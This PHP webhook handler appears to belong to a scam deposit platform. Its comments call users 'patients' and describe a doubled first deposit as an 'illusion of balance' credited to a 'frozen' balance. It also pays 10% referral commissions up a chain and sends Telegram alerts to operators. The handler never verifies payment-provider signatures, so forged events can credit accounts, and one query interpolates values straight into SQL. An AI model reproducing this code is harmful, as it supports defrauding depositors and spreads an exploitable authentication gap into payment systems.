<?php
// public/webhooks/webhook_pago.php
require '../../includes/config.php'; 

$input = file_get_contents('php://input');
$event = json_decode($input, true);

if (!$event) {
    http_response_code(400);
    exit();
}

$pago_confirmado = false;
$monto_real = 0;
$user_id = 0;
$metodo = "DESCONOCIDO";

// --- 1. LÓGICA DE DETECCIÓN MULTI-CANAL ---

// A. STRIPE (Tarjeta o Transferencia Bank)
if (isset($event['type']) && $event['type'] == 'charge.succeeded') {
    $data = $event['data']['object'];
    $monto_real = $data['amount'] / 100;
    $user_id = $data['metadata']['user_id'] ?? 0;
    $metodo = "STRIPE_CARD";
    $pago_confirmado = true;
}

// B. CONEKTA (SPEI / OXXO / Tarjeta)
elseif (isset($event['type']) && $event['type'] == 'order.paid') {
    $data = $event['data']['object'];
    $monto_real = $data['amount'] / 100;
    $metodo = $data['charges']['data'][0]['payment_method']['type'] ?? "CONEKTA";
    
    // En Conekta, si es SPEI, el user_id suele venir en metadata o nota
    $user_id = $data['metadata']['user_id'] ?? 0;
    $pago_confirmado = true;
}

// C. OPENPAY (SPEI Específico)
elseif (isset($event['type']) && $event['type'] == 'transaction.succeeded') {
    $data = $event['transaction'];
    if ($data['status'] == 'completed') {
        $monto_real = $data['amount'];
        $user_id = $data['metadata']['user_id'] ?? 0;
        
        // Si no viene en metadata, intentamos extraerlo del concepto/referencia (ej: "REF-123")
        if ($user_id == 0 && isset($data['description'])) {
            preg_match('/REF-(\d+)/', $data['description'], $matches);
            $user_id = $matches[1] ?? 0;
        }
        
        $metodo = ($data['method'] == 'bank_transfer') ? "SPEI_NEXUS" : "CARD_NEXUS";
        $pago_confirmado = true;
    }
}

// --- 2. EJECUCIÓN DEL SISTEMA NEXUS ---

if ($pago_confirmado && $user_id > 0) {
    
    // Consultar el estado del "paciente" (usuario)
    $stmt = $conn->prepare("SELECT saldo_congelado, referido_por_id FROM usuarios WHERE id = ?");
    $stmt->bind_param("i", $user_id);
    $stmt->execute();
    $res = $stmt->get_result()->fetch_assoc();

    if ($res) {
        $monto_inyectar = $monto_real;
        $bono_activado = false;

        // Lógica de Bienvenida (Ilusión de saldo x2)
        if ($res['saldo_congelado'] <= 0) {
            $monto_inyectar = $monto_real * 2;
            $bono_activado = true;
        }

        // Actualizar Base de Datos (Saldo para el usuario)
        $update = $conn->prepare("UPDATE usuarios SET saldo_congelado = saldo_congelado + ? WHERE id = ?");
        $update->bind_param("di", $monto_inyectar, $user_id);
        $update->execute();

        // Registrar Log para que aparezca en su historial
        $detalle = "DEP_CONFIRMADO_" . $metodo . ($bono_activado ? "_BONO_X2" : "");
        $log = $conn->prepare("INSERT INTO log_transacciones (usuario_id, monto, tipo, detalle) VALUES (?, ?, 'deposito', ?)");
        $log->bind_param("ids", $user_id, $monto_inyectar, $detalle);
        $log->execute();

        // Comisión para el referidor (10%)
        if (!empty($res['referido_por_id'])) {
            $id_padre = $res['referido_por_id'];
            $comision = $monto_real * 0.10;
            $conn->query("UPDATE usuarios SET saldo_referidos = saldo_referidos + $comision WHERE id = $id_padre");
        }

        // --- 3. AUDITORÍA TELEGRAM ---
        $telegram_msg = "⚡ **NEXUS.OS: INYECCIÓN COMPLETADA**\n";
        $telegram_msg .= "----------------------------------\n";
        $telegram_msg .= "📡 **Canal:** $metodo\n";
        $telegram_msg .= "👤 **User ID:** #$user_id\n";
        $telegram_msg .= "💰 **Depósito:** $$monto_real MXN\n";
        if ($bono_activado) $telegram_msg .= "🚀 **Bonus:** X2 Aplicado\n";
        $telegram_msg .= "💵 **Total Sistema:** $$monto_inyectar MXN\n";
        $telegram_msg .= "----------------------------------\n";
        $telegram_msg .= "🤖 _Estado: Balance actualizado_";

        file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($telegram_msg) . "&parse_mode=Markdown");
    }
}

http_response_code(200);
echo json_encode(["status" => "processed"]);
?>
